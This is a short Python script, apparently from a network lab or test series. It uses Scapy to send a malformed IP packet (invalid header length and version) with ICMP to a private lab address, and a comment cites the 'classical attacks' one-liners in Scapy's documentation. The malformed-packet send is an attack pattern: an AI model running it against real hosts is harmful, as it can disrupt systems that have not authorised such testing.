import sys
from scapy.all import *

n = "34"
ipDest = "172.17.117.29"
#macDest = "08:00:27:84:90:86"
macDest = "ff:ff:ff:ff:ff:ff"
ipSrc  = "10.0.0.1"
gateway = "172.17.117.29"
#Classical attacks from http://www.secdev.org/projects/scapy/doc/usage.html#simple-one-liners
#Malformed packets:
send(IP(dst=ipDest, ihl=2, version=3)/ICMP())
print "**************************:" + n
